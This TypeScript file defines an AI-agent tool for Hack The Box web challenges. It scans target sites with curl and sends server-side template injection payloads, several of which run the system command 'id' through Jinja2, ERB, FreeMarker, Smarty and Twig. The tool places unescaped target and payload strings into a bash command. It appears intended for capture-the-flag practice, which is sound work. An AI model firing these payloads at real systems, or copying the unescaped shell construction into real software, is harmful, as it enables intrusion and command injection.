/**
 * @license
 * Copyright 2025 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { Config } from '../config/config.js';
import {
  BaseTool,
  ToolResult,
  ToolCallConfirmationDetails,
  ToolConfirmationOutcome,
} from './tools.js';
import { SchemaValidator } from '../utils/schemaValidator.js';
import { spawn } from 'child_process';
import stripAnsi from 'strip-ansi';

export interface HTBWebAnalyzerParams {
  analyzeType: 'tech-detect' | 'endpoint-scan' | 'template-inject' | 'full-analysis';
  target: string;
  technology?: string;
  payload?: string;
  options?: string;
  description?: string;
}

export class HTBWebAnalyzerTool extends BaseTool<HTBWebAnalyzerParams, ToolResult> {
  static Name: string = 'htb_web_analyzer';
  private whitelist: Set<string> = new Set();

  constructor(private readonly config: Config) {
    super(
      HTBWebAnalyzerTool.Name,
      'HTB Web Analyzer',
      `Advanced web application analysis tool for Hack The Box challenges. Supports:

- **tech-detect**: Identify server technologies, frameworks, and CMS
- **endpoint-scan**: Extract endpoints, forms, and API routes from HTML/JS
- **template-inject**: Test for template injection vulnerabilities
- **full-analysis**: Comprehensive scan including all above features

This tool helps identify attack vectors in web applications by analyzing server headers, HTML content, JavaScript files, and testing for common vulnerabilities.`,
      {
        type: 'object',
        properties: {
          analyzeType: {
            type: 'string',
            enum: ['tech-detect', 'endpoint-scan', 'template-inject', 'full-analysis'],
            description: 'Type of analysis to perform',
          },
          target: {
            type: 'string',
            description: 'Target URL to analyze',
          },
          technology: {
            type: 'string',
            description: 'Specific technology for template injection (e.g., jinja2, erb, freemarker)',
          },
          payload: {
            type: 'string',
            description: 'Custom payload for template injection testing',
          },
          options: {
            type: 'string',
            description: 'Additional options for the analysis',
          },
          description: {
            type: 'string',
            description: 'Brief description of the analysis purpose',
          },
        },
        required: ['analyzeType', 'target'],
      },
      false, // output is not markdown
      true, // output can be updated
    );
  }

  getDescription(params: HTBWebAnalyzerParams): string {
    let description = `HTB Web ${params.analyzeType} analysis`;
    if (params.target) {
      description += ` on ${params.target}`;
    }
    if (params.description) {
      description += ` (${params.description})`;
    }
    return description;
  }

  private buildCommand(params: HTBWebAnalyzerParams): string {
    const { analyzeType, target, technology, payload, options } = params;

    switch (analyzeType) {
      case 'tech-detect':
        // Combine multiple tools for comprehensive tech detection
        return `
          echo "=== Technology Detection for ${target} ===" &&
          echo -e "\\n[+] HTTP Headers Analysis:" &&
          curl -s -I "${target}" | grep -E "Server:|X-Powered-By:|X-Generator:|X-AspNet-Version:" &&
          echo -e "\\n[+] Wappalyzer Analysis:" &&
          (which wappalyzer >/dev/null 2>&1 && wappalyzer "${target}" || echo "Wappalyzer not installed") &&
          echo -e "\\n[+] WhatWeb Analysis:" &&
          (which whatweb >/dev/null 2>&1 && whatweb -a 3 "${target}" || echo "WhatWeb not installed") &&
          echo -e "\\n[+] Common Files Check:" &&
          for file in robots.txt .htaccess composer.json package.json .git/config; do
            echo -n "Checking /$file: ";
            curl -s -o /dev/null -w "%{http_code}" "${target}/$file" | grep -q "200" && echo "FOUND" || echo "Not found";
          done
        `.trim();
      
      case 'endpoint-scan':
        // Extract endpoints from HTML and JavaScript
        return `
          echo "=== Endpoint Discovery for ${target} ===" &&
          tmpfile=$(mktemp) &&
          curl -s "${target}" > "$tmpfile" &&
          echo -e "\\n[+] HTML Form Actions:" &&
          grep -oP '(?<=action=")[^"]*' "$tmpfile" | sort -u &&
          echo -e "\\n[+] JavaScript URLs:" &&
          grep -oE '(https?://|/)[^"'\''\\s<>{}]+' "$tmpfile" | grep -E '\\.(js|json|api|php|asp|jsp)' | sort -u &&
          echo -e "\\n[+] API Endpoints:" &&
          grep -oE '["'\'']/(api|v[0-9])/[^"'\'']*["'\'']' "$tmpfile" | tr -d '"'\''' | sort -u &&
          echo -e "\\n[+] Hidden/Comment URLs:" &&
          grep -oE '<!--[^>]*-->' "$tmpfile" | grep -oE '(https?://|/)[^\\s<>]+' | sort -u &&
          echo -e "\\n[+] JavaScript Files:" &&
          js_files=$(grep -oE 'src="[^"]*\\.js"' "$tmpfile" | cut -d'"' -f2) &&
          for js in $js_files; do
            echo "Analyzing: \$js";
            if [[ "\$js" =~ ^https?:// ]]; then
              curl -s "\$js" | grep -oE '["'\'']/(api|admin|user|login|upload|download|file)[^"'\'']*["'\'']' | tr -d '"'\''' | sort -u
            else
              curl -s "${target}\$js" | grep -oE '["'\'']/(api|admin|user|login|upload|download|file)[^"'\'']*["'\'']' | tr -d '"'\''' | sort -u
            fi
          done &&
          rm -f "$tmpfile"
        `.trim();
      
      case 'template-inject':
        // Test for template injection vulnerabilities
        const templatePayloads: Record<string, string[]> = {
          'generic': [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '*{7*7}',
          ],
          'jinja2': [
            '{{7*7}}',
            '{{config}}',
            '{{self.__init__.__globals__.__builtins__}}',
            '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
          ],
          'erb': [
            '<%= 7*7 %>',
            '<%= system("id") %>',
            '<%= `id` %>',
            '<%= IO.popen(\'id\').read %>',
          ],
          'freemarker': [
            '${7*7}',
            '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
            '${.now}',
          ],
          'velocity': [
            '#set($x=7*7)$x',
            '#set($str=$class.inspect("java.lang.String").type)',
            '#set($runtime=$str.class.forName("java.lang.Runtime"))',
          ],
          'smarty': [
            '{7*7}',
            '{php}echo `id`;{/php}',
            '{system(\'id\')}',
          ],
          'twig': [
            '{{7*7}}',
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
          ],
        };

        const tech = technology || 'generic';
        const payloads = payload ? [payload] : (templatePayloads[tech] || templatePayloads['generic']);
        
        return `
          echo "=== Template Injection Testing for ${target} ===" &&
          echo "Testing with ${tech} payloads..." &&
          endpoint="${target}" &&
          ${payloads.map((p: string, idx: number) => `
            echo -e "\\n[+] Testing payload ${idx + 1}: ${p}" &&
            response=$(curl -s -X POST "${target}" -d "input=${encodeURIComponent(p)}" -H "Content-Type: application/x-www-form-urlencoded") &&
            echo "Response snippet:" &&
            echo "$response" | grep -C 2 -E "49|7\\*7|uid=|root|www-data" || echo "No direct indication of injection" &&
            echo -e "\\n[+] Testing in GET parameter:" &&
            curl -s "${target}?input=${encodeURIComponent(p)}" | grep -C 2 -E "49|7\\*7|uid=|root|www-data" || echo "No direct indication of injection"
          `).join(' && ')}
        `.trim();
      
      case 'full-analysis':
        // Comprehensive analysis combining all techniques
        return `
          echo "=== Comprehensive Web Analysis for ${target} ===" &&
          ${this.buildCommand({ ...params, analyzeType: 'tech-detect' })} &&
          echo -e "\\n\\n" &&
          ${this.buildCommand({ ...params, analyzeType: 'endpoint-scan' })} &&
          echo -e "\\n\\n" &&
          ${this.buildCommand({ ...params, analyzeType: 'template-inject', technology: 'generic' })}
        `.trim();
      
      default:
        throw new Error(`Unknown analyze type: ${analyzeType}`);
    }
  }

  validateToolParams(params: HTBWebAnalyzerParams): string | null {
    if (!SchemaValidator.validate(this.parameterSchema as Record<string, unknown>, params)) {
      return 'Parameters failed schema validation.';
    }

    if (!params.target) {
      return 'Target URL is required.';
    }

    if (!params.target.startsWith('http://') && !params.target.startsWith('https://')) {
      return 'Target must be a valid HTTP/HTTPS URL.';
    }

    return null;
  }

  async shouldConfirmExecute(
    params: HTBWebAnalyzerParams,
    _abortSignal: AbortSignal,
  ): Promise<ToolCallConfirmationDetails | false> {
    if (this.validateToolParams(params)) {
      return false; // skip confirmation, execute call will fail immediately
    }
    
    if (this.whitelist.has(params.analyzeType)) {
      return false; // already approved and whitelisted
    }

    return {
      type: 'exec',
      title: `Confirm HTB Web ${params.analyzeType} Analysis`,
      command: this.buildCommand(params).split('\n')[0] + '...', // Show first line
      rootCommand: `htb-web-${params.analyzeType}`,
      onConfirm: async (outcome: ToolConfirmationOutcome) => {
        if (outcome === ToolConfirmationOutcome.ProceedAlways) {
          this.whitelist.add(params.analyzeType);
        }
      },
    };
  }

  async execute(
    params: HTBWebAnalyzerParams,
    abortSignal: AbortSignal,
    updateOutput?: (chunk: string) => void,
  ): Promise<ToolResult> {
    const validationError = this.validateToolParams(params);
    if (validationError) {
      return {
        llmContent: `HTB web analysis rejected: ${validationError}`,
        returnDisplay: `Error: ${validationError}`,
      };
    }

    if (abortSignal.aborted) {
      return {
        llmContent: 'HTB web analysis was cancelled by user before it could start.',
        returnDisplay: 'Analysis cancelled by user.',
      };
    }

    const command = this.buildCommand(params);
    const shell = spawn('bash', ['-c', command], {
      stdio: ['ignore', 'pipe', 'pipe'],
      cwd: this.config.getTargetDir(),
    });

    let exited = false;
    let stdout = '';
    let stderr = '';
    let lastUpdateTime = Date.now();

    const OUTPUT_UPDATE_INTERVAL_MS = 1000;

    const appendOutput = (str: string) => {
      if (updateOutput && Date.now() - lastUpdateTime > OUTPUT_UPDATE_INTERVAL_MS) {
        updateOutput(stdout + stderr);
        lastUpdateTime = Date.now();
      }
    };

    shell.stdout.on('data', (data: Buffer) => {
      if (!exited) {
        const str = stripAnsi(data.toString());
        stdout += str;
        appendOutput(str);
      }
    });

    shell.stderr.on('data', (data: Buffer) => {
      if (!exited) {
        const str = stripAnsi(data.toString());
        stderr += str;
        appendOutput(str);
      }
    });

    let error: string | null = null;
    shell.on('error', (err: Error) => {
      error = err.message;
    });

    let code: number | null = null;
    let processSignal: NodeJS.Signals | null = null;
    shell.on('exit', (_code: number | null, _signal: NodeJS.Signals | null) => {
      exited = true;
      code = _code;
      processSignal = _signal;
    });

    const abortHandler = () => {
      if (shell.pid && !exited) {
        try {
          process.kill(-shell.pid, 'SIGTERM');
        } catch (_e) {
          shell.kill('SIGKILL');
        }
      }
    };
    abortSignal.addEventListener('abort', abortHandler);

    // Wait for the shell to exit
    try {
      await new Promise((resolve) => shell.on('exit', resolve));
    } finally {
      abortSignal.removeEventListener('abort', abortHandler);
    }

    let llmContent = '';
    if (abortSignal.aborted) {
      llmContent = 'HTB web analysis was cancelled by user before it could complete.';
      if (stdout.trim() || stderr.trim()) {
        llmContent += ` Below is the output before it was cancelled:\n${stdout}${stderr}`;
      }
    } else {
      llmContent = [
        `HTB Web Analysis Type: ${params.analyzeType}`,
        `Target: ${params.target}`,
        `Technology: ${params.technology || 'auto-detect'}`,
        `Stdout: ${stdout || '(empty)'}`,
        `Stderr: ${stderr || '(empty)'}`,
        `Exit Code: ${code ?? '(none)'}`,
      ].join('\n');
    }

    let returnDisplayMessage = '';
    if (stdout.trim() || stderr.trim()) {
      returnDisplayMessage = stdout + stderr;
    } else if (abortSignal.aborted) {
      returnDisplayMessage = 'Analysis cancelled by user.';
    } else if (error) {
      returnDisplayMessage = `Analysis failed: ${error}`;
    } else if (code !== null && code !== 0) {
      returnDisplayMessage = `Analysis exited with code: ${code}`;
    }

    return { llmContent, returnDisplay: returnDisplayMessage };
  }
}

// Helper function to encode URI components
function encodeURIComponent(str: string): string {
  return str.replace(/[!'()*]/g, (c) => {
    return '%' + c.charCodeAt(0).toString(16).toUpperCase();
  });
} 